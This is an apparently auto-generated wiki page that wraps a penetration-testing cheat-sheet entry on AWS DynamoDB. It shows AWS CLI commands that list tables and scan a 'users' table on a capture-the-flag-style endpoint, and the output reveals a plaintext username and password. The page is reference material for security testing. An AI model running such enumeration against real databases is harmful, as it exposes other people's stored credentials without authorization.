---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# AWS - Service - DynamoDB

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-aws-aws-dynamodb` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-dynamodb.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memo

## Preserved Body

````markdown
> Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.

## List Tables

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        

{
    "TableNames": [
        "users"
    ]
}
```

## Enumerate Table Content

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'

{
  "password": {
    "S": "Management@#1@#"
  },
  "username": {
    "S": "Mgmt"
  }
}
```

## References

* [Amazon DynamoDB Documentation - AWS](https://docs.aws.amazon.com/dynamodb/)
````

## Source Verification

[source record](../../sources/internalallthethings/aws-service-dynamodb.md)

## Evidence Excerpt

````text
_body: "# AWS - Service - DynamoDB\n\n> Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond\
\ performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup\
\ and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests\
\ per day and can support peaks of more than 20 million requests per second.\n\n## List Tables\n\n```bash\n$ aws --endpoint-url\
\ http://s3.bucket.htb dynamodb list-tables        \n\n{\n    \"TableNames\": [\n        \"users\"\n    ]\n}\n```\n\n##\
\ Enumerate Table Content\n\n```bash\n$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r\
\ '.Items[]'\n\n{\n  \"password\": {\n    \"S\": \"Management@#1@#\"\n  },\n  \"username\": {\n    \"S\": \"Mgmt\"\n  }\n\
}\n```\n\n## References\n\n* [Amazon DynamoDB Documentation - AWS](https://docs.aws.amazon.com/dynamodb/)"
````
